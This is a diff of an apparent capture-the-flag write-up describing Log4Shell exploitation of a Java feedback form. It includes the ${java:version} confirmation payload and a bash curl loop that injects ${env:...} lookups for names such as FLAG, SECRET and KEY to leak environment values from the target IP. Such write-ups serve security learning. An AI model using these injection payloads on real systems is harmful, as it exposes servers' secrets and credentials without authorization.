@@ -18,15 +18,15 @@ With no where else to look, i intercepted the request using ZAP.
 <img width="1315" height="555" alt="image" src="https://github.com/user-attachments/assets/ceb22927-44ac-4f77-9621-cc402f2cd663" />
 <img width="799" height="96" alt="image" src="https://github.com/user-attachments/assets/6de0d39c-c4c4-4ba6-bd6a-4359cd074ec5" />
 
-And in the ZAP intercept request, We see that Our feedback is getting read directly in the logs.
+And in the ZAP intercept request, We see that Our feedback is getting read directly in the logs. <br>
 
 So i did some research on Java And logs, And i came across a known vulnerability in Old Java versions,
 <pre>(CVE-2021-44228)</pre>
-This vulnerability causes us to have RCE ( Remote code execution ) Through logs, And this is what we need!
-So, Lets confirm our suspicions and try something basic, I Tried ${java:version}, And voila we get the java version back, AKA, It is vulnerable.
+This vulnerability causes us to have RCE ( Remote code execution ) Through logs, And this is what we need! <br>
+So, Lets confirm our suspicions and try something basic, I Tried ${java:version}, And voila we get the java version back, AKA, It is vulnerable. <br>
 <img width="1884" height="1027" alt="image" src="https://github.com/user-attachments/assets/47f8d08b-e228-49f0-af15-cb69412853b8" />
-<h3>Annnd Yes, its log4j exploit.</h3>
-<h3>Then after some digging, I found this cool article Which walks through how to exploit it.</h3>
-<pre>https://raxis.com/blog/log4j-exploit/</pre>
-<h3>After alot of tries, It still didnt manage to work, No matter what i did.</h3>
+So, After Alot of tries to set up a Reverse shell using JNDI, I couldnt make it work, So it probably suggests that this version had JNDI Already disabled. So it hought, what if i just try random env keys? ${env:KEY}
 
+So i made this simple for loop with some common names.
+
+<pre> for i in Admin admin ADMIN user USER User Owner Root root PCTF pctf MASONC masonc Pctf pCTF FLAG FLAG_CTF CTF SECRET FLAG KEY SECRET_FLAG FLAGS FLAGO flag secret secret_flag FLAG_SECRET secret_flag FLAG_SECRET secret_FLAG FLAG_SECRET; do echo "Trying \${env:$i}"; curl -s -X POST http://18.212.136.134:8080/feedback -H "X-Requested-With: XMLHttpRequest" -H "Content-Type:application/x-www-form-urlencoded;charset=UTF-8" -d "feedback=\${env:$i}" | grep -o "User .*"; done </pre>
